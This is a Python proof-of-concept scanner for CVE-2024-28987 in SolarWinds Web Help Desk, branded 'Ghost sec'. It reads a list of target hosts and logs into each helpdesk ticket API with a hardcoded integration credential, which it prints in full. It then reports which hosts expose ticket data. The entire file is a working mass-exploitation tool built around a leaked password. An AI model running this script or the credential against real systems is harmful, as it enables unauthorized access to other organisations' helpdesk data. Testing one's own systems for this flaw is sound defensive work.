import argparse
import base64
import requests

# Created by Ghost sec.
RED = "\033[91m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"

ascii_art = f"""
{BOLD}{RED}
  ______   __                              __                                         
 /      \ /  |                            /  |                                        
/$$$$$$  |$$ |____    ______    _______  _$$ |_           _______   ______    _______ 
$$ | _$$/ $$      \  /      \  /       |/ $$   |         /       | /      \  /       |
$$ |/    |$$$$$$$  |/$$$$$$  |/$$$$$$$/ $$$$$$/         /$$$$$$$/ /$$$$$$  |/$$$$$$$/ 
$$ |$$$$ |$$ |  $$ |$$ |  $$ |$$      \   $$ | __       $$      \ $$    $$ |$$ |      
$$ \__$$ |$$ |  $$ |$$ \__$$ | $$$$$$  |  $$ |/  |       $$$$$$  |$$$$$$$$/ $$ \_____ 
$$    $$/ $$ |  $$ |$$    $$/ /     $$/   $$  $$/       /     $$/ $$       |$$       |
 $$$$$$/  $$/   $$/  $$$$$$/  $$$$$$$/     $$$$/        $$$$$$$/   $$$$$$$/  $$$$$$$/ 
 PROOF OF CONCEPT CVE-2024-28987 || SCANNING VULNERABILITY POC || github.com/fa-rrel
{RESET}
"""

print(ascii_art)

def get_basic_auth_header(username, password):
    credentials = f"{username}:{password}"
    base64_credentials = base64.b64encode(credentials.encode()).decode('utf-8')
    return {'Authorization': f'Basic {base64_credentials}'}

def scan_target(hostname):
    # Ensure hostname does not have trailing slashes
    hostname = hostname.strip().rstrip('/')
    url = f"http://{hostname}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/"
    
    # Print formatted URL for debugging
    print(f"{BOLD}[*] Scanning URL: {url}{RESET}")
    
    headers = get_basic_auth_header("helpdeskIntegrationUser", "dev-C4F8025E7")
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200 and 'displayClient' in response.text and 'shortDetail' in response.text:
            print(f"{BOLD}{GREEN}[+] Vulnerability confirmed on {hostname} with username: 'helpdeskIntegrationUser' and password: 'dev-C4F8025E7'{RESET}")
        else:
            print(f"{BOLD}{RED}[-] No vulnerability detected on {hostname}{RESET}")
    except requests.RequestException:
        # Modify this line to just print "Not vulnerable" instead of the error details
        print(f"{BOLD}{RED}[-] Not vulnerable on {hostname}{RESET}")

def scan_targets_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            targets = file.readlines()
            if not targets:
                print(f"{BOLD}{RED}[!] No targets found in file{RESET}")
                return
            for target in targets:
                target = target.strip()
                if target:
                    scan_target(target)
    except FileNotFoundError:
        print(f"{BOLD}{RED}[!] File {file_path} not found{RESET}")
    except Exception as e:
        print(f"{BOLD}{RED}[!] An error occurred: {e}{RESET}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-28987 Scanner - SolarWinds Web Help Desk Hardcoded Credential")
    parser.add_argument('-f', '--file', type=str, required=True, help='File containing list of targets')

    args = parser.parse_args()
    
    scan_targets_from_file(args.file)

if __name__ == "__main__":
    main()
